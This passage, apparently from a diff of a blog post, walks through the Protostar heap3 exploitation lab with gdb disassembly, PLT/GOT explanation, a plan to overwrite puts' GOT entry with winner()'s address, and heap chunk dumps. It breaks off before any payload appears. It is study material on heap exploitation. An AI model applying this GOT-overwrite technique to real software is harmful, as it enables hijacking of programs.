+</span><span class='line'><span class="mh">0x08048902</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x08048905</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804890a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x0804890e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">133</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x08048911</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x08048916</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">141</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x0804891a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x0804891d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x08048922</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
+</span><span class='line'><span class="mh">0x08048926</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">157</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+</span><span class='line'><span class="mh">0x08048929</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">160</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804892e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">165</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804ac27</span>
+</span><span class='line'><span class="mh">0x08048935</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</span><span class='line'><span class="mh">0x0804893a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">177</span><span class="o">&gt;:</span>  <span class="n">leave</span>
+</span><span class='line'><span class="mh">0x0804893b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;:</span>  <span class="n">ret</span>
+</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
+which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
+entry at address <code>0x8048790</code>. If we disassemble that address we see</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="mh">0x8048790</span>
+</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">puts</span><span class="err">@</span><span class="nl">plt</span><span class="p">:</span>
+</span><span class='line'><span class="mh">0x08048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x804b128</span>
+</span><span class='line'><span class="mh">0x08048796</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="mh">0x68</span>
+</span><span class='line'><span class="mh">0x0804879b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="mh">0x80486b0</span>
+</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
+(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
+</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
+contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>
+
+<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
+call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048ff2</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048ff2</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3211.</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048750</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048750</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8049824</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">at</span> <span class="mh">0x8049824</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3583.</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048790</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span> <span class="n">at</span> <span class="mh">0x8048790</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run the program with some recognizable input strings.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
+</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
+</span><span class='line'><span class="mi">3211</span>  <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
+</span><span class='line'>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
+initialized.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
+</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now look at the mapped memory regions.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="n">mapping</span>
+</span><span class='line'><span class="n">process</span> <span class="mi">1542</span>
+</span><span class='line'><span class="n">cmdline</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
+</span><span class='line'><span class="n">cwd</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">&#39;</span>
+</span><span class='line'><span class="n">exe</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
+</span><span class='line'><span class="n">Mapped</span> <span class="n">address</span> <span class="nl">spaces</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">Start</span> <span class="n">Addr</span>   <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
+</span><span class='line'>   <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
+</span><span class='line'>   <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x3000</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
+</span><span class='line'>   <span class="mh">0x804c000</span>  <span class="mh">0x804d000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
+</span><span class='line'>  <span class="mh">0xb7e96000</span> <span class="mh">0xb7e97000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>
+</span><span class='line'>  <span class="mh">0xb7e97000</span> <span class="mh">0xb7fd5000</span>   <span class="mh">0x13e000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7fd5000</span> <span class="mh">0xb7fd6000</span>     <span class="mh">0x1000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7fd6000</span> <span class="mh">0xb7fd8000</span>     <span class="mh">0x2000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7fd8000</span> <span class="mh">0xb7fd9000</span>     <span class="mh">0x1000</span>   <span class="mh">0x140000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7fd9000</span> <span class="mh">0xb7fdc000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>
+</span><span class='line'>  <span class="mh">0xb7fe0000</span> <span class="mh">0xb7fe2000</span>     <span class="mh">0x2000</span>          <span class="mi">0</span>
+</span><span class='line'>  <span class="mh">0xb7fe2000</span> <span class="mh">0xb7fe3000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
+</span><span class='line'>  <span class="mh">0xb7fe3000</span> <span class="mh">0xb7ffe000</span>    <span class="mh">0x1b000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7ffe000</span> <span class="mh">0xb7fff000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1a000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xb7fff000</span> <span class="mh">0xb8000000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1b000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
+</span><span class='line'>  <span class="mh">0xbffeb000</span> <span class="mh">0xc0000000</span>    <span class="mh">0x15000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
+define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
+time execution stops.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">define</span> <span class="n">hook</span><span class="o">-</span><span class="n">stop</span>
+</span><span class='line'><span class="n">Type</span> <span class="n">commands</span> <span class="k">for</span> <span class="n">definition</span> <span class="n">of</span> <span class="s">&quot;hook-stop&quot;</span><span class="p">.</span>
+</span><span class='line'><span class="n">End</span> <span class="n">with</span> <span class="n">a</span> <span class="n">line</span> <span class="n">saying</span> <span class="n">just</span> <span class="s">&quot;end&quot;</span><span class="p">.</span>
+</span><span class='line'><span class="o">&gt;</span><span class="n">x</span><span class="o">/</span><span class="mi">56</span><span class="n">wx</span> <span class="mh">0x804c000</span>
+</span><span class='line'><span class="o">&gt;</span><span class="n">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000fb1</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
+</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
+<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
+<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
+10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
+indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
+because there&rsquo;s no previous chunk that&rsquo;s free.</p>
+
+<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
+It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
+remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
